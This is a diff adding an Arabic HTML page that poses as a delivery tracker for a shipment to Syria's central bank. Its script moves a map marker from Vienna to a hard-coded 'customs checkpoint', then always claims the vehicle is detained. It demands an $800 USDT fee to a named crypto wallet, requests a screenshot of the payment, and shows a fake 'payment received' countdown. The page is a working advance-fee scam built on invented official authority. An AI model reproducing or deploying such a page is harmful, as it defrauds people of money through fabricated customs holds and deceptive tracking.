@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>متتبع تسليم مصرف سورية المركزي</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <style>
+    body {
+      font-family: 'Segoe UI', 'Cairo', 'Tajawal', sans-serif;
+      background-color: #f5f5f5;
+      color: #333;
+      text-align: center;
+      padding: 20px;
+      direction: rtl;
+    }
+    h1 {
+      color: #177b36;
+    }
+    h2, h3 {
+      color: #ff6600;
+    }
+    #map {
+      height: 500px;
+      width: 100%;
+      max-width: 800px;
+      margin: 20px auto;
+      border: 2px solid #177b36;
+    }
+    #paymentPrompt, #confirmation {
+      display: none;
+    }
+    .blinking {
+      animation: blink 1s infinite;
+      color: red;
+      font-weight: bold;
+    }
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+    input[type="file"] {
+      margin-top: 10px;
+    }
+    button {
+      background-color: #177b36;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    button:hover {
+      background-color: #ff6600;
+    }
+    code {
+      background-color: #eee;
+      padding: 2px 6px;
+      border-radius: 4px;
+      direction: ltr;
+      unicode-bidi: embed;
+    }
+    #status {
+      margin-top: 10px;
+      font-weight: bold;
+      color: #177b36;
+    }
+    #countdown {
+      font-size: 18px;
+      margin-top: 10px;
+      color: #ff6600;
+    }
+    #badge {
+      margin-top: 10px;
+    }
+    #badge img {
+      width: 100px;
+    }
+  </style>
+</head>
+<body>
+  <h1>🏦 متتبع تسليم مصرف سورية المركزي</h1>
+  <h3>رقم التتبع: <code>6910559669</code></h3>
+  <div id="status">الحالة: المركبة تغادر فيينا...</div>
+
+  <div id="map"></div>
+
+  <div id="paymentPrompt">
+    <h3>🛑 المركبة محتجزة لدى الجمارك الأوروبية</h3>
+    <div id="badge">
+      <img src="IMG_4924.jpeg" alt="شارة الجمارك" />
+    </div>
+    <p>السبب: خلل في التدفق المالي أثناء الإرسال</p>
+    <p>الرسوم المطلوبة للإفراج: <strong>٨٠٠ دولار أمريكي USDT (BEP20)</strong></p>
+    <p><strong>عنوان محفظة USDT BEP20:</strong> <code>0x3140ee41555a14a7e0c4c96a636e63b24946d4f9</code></p>
+    <p><strong>قيمة التسليم: ١٦٬٠٠٠ دولار أمريكي</strong></p>
+    <p class="blinking">📍 المركبة محتجزة حالياً عند نقطة التفتيش</p>
+    <p><strong>يرجى رفع صورة تثبت إتمام الدفع لمتابعة التسليم:</strong></p>
+    <input type="file" accept="image/*" onchange="confirmDelivery()" />
+  </div>
+
+  <div id="confirmation">
+    <h2>✅ تم استلام الدفعة</h2>
+    <p>سيتم استئناف تسليم الطرد إلى مصرف سورية المركزي.</p>
+    <div id="countdown">يستأنف خلال: <span id="timer">00:00</span></div>
+    <img id="uploadedImage" src="" alt="صورة إثبات الدفع" style="max-width: 100%; margin-top: 20px;" />
+  </div>
+
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script>
+    const map = L.map('map').setView([48.2082, 16.3738], 6); // فيينا
+
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: 'Map data © OpenStreetMap contributors'
+    }).addTo(map);
+
+    const route = [
+      [48.2082, 16.3738], // فيينا
+      [48.5, 13.5],       // منتصف الطريق
+      [48.8, 11.4],       // نقطة التفتيش
+      [33.5138, 36.2765]  // مصرف سورية المركزي، دمشق (تغيير الوجهة النهائية)
+    ];
+
+    const checkpointIndex = 2;
+    let currentIndex = 0;
+
+    const vehicleIcon = L.icon({
+      iconUrl: 'https://cdn-icons-png.flaticon.com/512/1995/1995526.png',
+      iconSize: [40, 40],
+      iconAnchor: [20, 20]
+    });
+
+    const vehicleMarker = L.marker(route[0], { icon: vehicleIcon }).addTo(map);
+
+    const polyline = L.polyline(route, { color: '#177b36' }).addTo(map);
+    map.fitBounds(polyline.getBounds());
+
+    function updateStatus(text) {
+      document.getElementById("status").innerText = "الحالة: " + text;
+    }
+
+    function moveVehicle() {
+      if (currentIndex < route.length - 1) {
+        currentIndex++;
+        vehicleMarker.setLatLng(route[currentIndex]);
+
+        if (currentIndex === checkpointIndex) {
+          updateStatus("المركبة محتجزة عند نقطة الجمارك");
+          document.getElementById("paymentPrompt").style.display = "block";
+        } else {
+          updateStatus("المركبة في الطريق...");
+          setTimeout(moveVehicle, 3000);
+        }
+      } else {
+        updateStatus("وصلت المركبة إلى مصرف سورية المركزي");
+      }
+    }
+
+    setTimeout(moveVehicle, 3000); // بدء الحركة بعد 3 ثوانٍ
+
+    function confirmDelivery() {
+      const fileInput = event.target;
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        document.getElementById("uploadedImage").src = e.target.result;
+        document.getElementById("paymentPrompt").style.display = "none";
+        document.getElementById("confirmation").style.display = "block";
+        updateStatus("تم استلام الدفعة. جاري استئناف التسليم...");
+
+        startCountdown(10); // عد تنازلي 10 ثوانٍ قبل الاستئناف
+      };
+      reader.readAsDataURL(fileInput.files[0]);
+    }
+
+    function startCountdown(seconds) {
+      let remaining = seconds;
+      const timerDisplay = document.getElementById("timer");
+      const interval = setInterval(() => {
+        timerDisplay.textContent = `00:${remaining < 10 ? '0' : ''}${remaining}`;
+        remaining--;
+        if (remaining < 0) {
+          clearInterval(interval);
+          document.getElementById("confirmation").style.display = "none";
+          currentIndex++;
+          vehicleMarker.setLatLng(route[currentIndex]);
+          updateStatus("تم استئناف التسليم إلى مصرف سورية المركزي");
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
